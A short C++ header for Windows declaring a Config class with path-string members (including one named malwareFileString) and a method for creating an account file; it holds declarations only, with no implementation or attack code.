#pragma once
#include <Windows.h>
#include <string>
#include <wchar.h>
using namespace std;

class Config {
public:
	string accountFile;
	string malwareFileString;
	string placedFiles;
	Config();
	string createAccountFile(int type);
private:
	string formatChars(wchar_t toFormat[MAX_PATH]);
};